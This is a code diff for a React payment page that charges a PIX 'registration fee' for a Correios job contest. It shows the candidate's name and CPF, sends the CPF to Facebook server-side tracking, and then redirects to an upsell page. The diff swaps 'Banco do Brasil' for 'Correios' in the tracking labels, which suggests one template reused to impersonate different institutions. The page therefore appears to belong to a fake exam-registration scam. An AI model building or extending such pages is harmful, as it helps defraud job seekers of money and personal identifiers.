@@ -75,14 +75,12 @@ const Pagamento = () => {
         if (response.error) { setPixError('Erro ao gerar PIX. Tente novamente.'); return; }
         const data = response.data;
         console.log('[Pagamento] Fruitfy response:', data);
-        // Extract PIX data from Fruitfy response
         const pixCode = data?.data?.pix?.code || data?.data?.pix_code;
         const pixQrBase64 = data?.data?.pix?.qr_code_base64 || data?.data?.pix?.qrcode_base64 || '';
         const orderUuid = data?.data?.order_id || data?.data?.order_uuid || '';
         if ((pixCode || pixQrBase64) && orderUuid) {
           const newPixData: PixData = { code: pixCode, qrcode_base64: pixQrBase64, transaction_id: orderUuid, order_uuid: orderUuid };
           setPixData(newPixData);
-          // Save using external_id field for backward compat with persistence
           savePixData(pixStorageKey, { code: pixCode, qrcode_base64: pixQrBase64, transaction_id: orderUuid, external_id: orderUuid }, getUtmSignature());
           startPaymentCheck(orderUuid);
         } else { 
@@ -106,8 +104,8 @@ const Pagamento = () => {
         const response = await supabase.functions.invoke('check-pix-status', { body: { order_uuid: orderUuid } });
         if (response.data?.data?.status === 'paid') {
           if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
-          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Banco do Brasil' });
-          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Banco do Brasil' });
+          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
+          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
           navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio, protocolo } });
         }
@@ -127,8 +125,8 @@ const Pagamento = () => {
       supabase.functions.invoke('check-pix-status', { body: { order_uuid: pixData.order_uuid } }).then((response) => {
         if (response.data?.data?.status === 'paid') {
           if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
-          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Banco do Brasil' });
-          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Banco do Brasil' });
+          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
+          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
           navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio, protocolo } });
         } else {
@@ -143,7 +141,7 @@ const Pagamento = () => {
 
   return (
     <div className="min-h-screen flex flex-col bg-background">
-      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Inscrição > Pagamento" />
+      <CorreiosHeader breadcrumb="Concursos > Atendente Comercial > Inscrição > Pagamento" />
 
       <main className="flex-1 px-4 py-6 sm:py-8">
         <div className="max-w-lg mx-auto space-y-5">
@@ -152,7 +150,7 @@ const Pagamento = () => {
 
           {isLoadingPix ? (
             <div className="flex flex-col items-center justify-center py-12 space-y-4">
-              <Loader2 className="w-12 h-12 animate-spin text-primary" />
+              <Loader2 className="w-12 h-12 animate-spin text-accent" />
               <p className="text-muted-foreground font-medium">Gerando PIX de inscrição...</p>
             </div>
           ) : pixError ? (
@@ -176,7 +174,7 @@ const Pagamento = () => {
                 <tbody>
                   <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
                   <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
-                  <tr><td className="font-semibold">Taxa de Inscrição</td><td className="font-black text-primary">R$ {valorBeneficio.toFixed(2).replace('.', ',')}</td></tr>
+                  <tr><td className="font-semibold">Taxa de Inscrição</td><td className="font-black text-accent">R$ {valorBeneficio.toFixed(2).replace('.', ',')}</td></tr>
                   {protocolo && <tr><td className="font-semibold">Protocolo</td><td className="font-mono text-xs">{protocolo}</td></tr>}
                 </tbody>
               </table>
@@ -188,7 +186,7 @@ const Pagamento = () => {
               ) : (
                 <div className="space-y-4 animate-fade-in">
                   <p className="text-xs text-muted-foreground font-medium text-center">Escaneie o QR Code ou copie o código PIX:</p>
-                  <div className="w-44 h-44 mx-auto bg-card rounded border-2 border-primary p-2">
+                  <div className="w-44 h-44 mx-auto bg-card rounded border-2 border-accent p-2">
                     {pixData?.qrcode_base64 ? (
                       <img src={pixData.qrcode_base64.startsWith('data:') ? pixData.qrcode_base64 : `data:image/png;base64,${pixData.qrcode_base64}`} alt="QR Code PIX" className="w-full h-full rounded" />
                     ) : (
@@ -197,7 +195,7 @@ const Pagamento = () => {
                       </div>
                     )}
                   </div>
-                  <Button variant="outline" onClick={handleCopiarPix} disabled={!pixData?.code} className="w-full h-12 border-2 border-primary text-primary font-bold text-sm">
+                  <Button variant="outline" onClick={handleCopiarPix} disabled={!pixData?.code} className="w-full h-12 border-2 border-accent text-accent font-bold text-sm">
                     <Copy className="w-4 h-4 mr-2" /> Copiar código PIX
                   </Button>
                   <Button onClick={handleConfirmarPagamento} disabled={isProcessing || !pixData} className="w-full h-14 text-sm font-bold">
